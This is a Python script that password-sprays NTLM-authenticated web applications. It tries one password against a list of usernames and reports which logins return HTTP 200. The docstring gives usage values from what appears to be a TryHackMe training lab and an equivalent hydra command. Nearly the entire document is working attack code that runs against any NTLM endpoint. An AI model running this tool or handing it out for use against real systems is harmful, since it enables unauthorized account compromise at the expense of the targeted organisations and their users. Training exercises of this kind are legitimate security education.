#!/usr/bin/python3

"""
This function takes our suggested password and the URL that we are targeting as input and attempts to authenticate to the URL with each username in the textfile. 
By monitoring the differences in HTTP response codes from the application, we can determine if the credential pair is valid or not. 
If the credential pair is valid, the application would respond with a 200 HTTP (OK) code. 
If the pair is invalid, the application will return a 401 HTTP (Unauthorised) code.

We can run the script using the following command:
python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>

We provide the following values for each of the parameters:

<userfile> - Textfile containing our usernames - "usernames.txt"
<fqdn> - Fully qualified domain name associated with the organisation that we are attacking - "za.tryhackme.com"
<password> - The password we want to use for our spraying attack - "Changeme123"
<attackurl> - The URL of the application that supports Windows Authentication - "http://ntlmauth.za.tryhackme.com"


hydra -L <username_list> -p <pwd_to_spray> <host> http-get '/:A=NTLM:F=401'
"""


import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt

class NTLMSprayer:
    def __init__(self, fqdn):
        self.HTTP_AUTH_FAILED_CODE = 401
        self.HTTP_AUTH_SUCCEED_CODE = 200
        self.verbose = True
        self.fqdn = fqdn

    def load_users(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))

    def password_spray(self, password, url):
        print ("[*] Starting passwords spray attack using the following password: " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
                print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
                count += 1
                continue
            if (self.verbose):
                if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                    print ("[-] Failed login with Username: " + user)
        print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")

def main(argv):
    userfile = ''
    fqdn = ''
    password = ''
    attackurl = ''

    try:
        opts, args = getopt.getopt(argv, "hu:f:p:a:", ["userfile=", "fqdn=", "password=", "attackurl="])
    except getopt.GetoptError:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

    for opt, arg in opts:
        if opt == '-h':
            print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-f", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-a", "--attackurl"):
            attackurl = str(arg)

    if (len(userfile) > 0 and len(fqdn) > 0 and len(password) > 0 and len(attackurl) > 0):
        #Start attack
        sprayer = NTLMSprayer(fqdn)
        sprayer.load_users(userfile)
        sprayer.password_spray(password, attackurl)
        sys.exit()
    else:
        print ("ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>")
        sys.exit(2)

if __name__ == "__main__":
    main(sys.argv[1:])
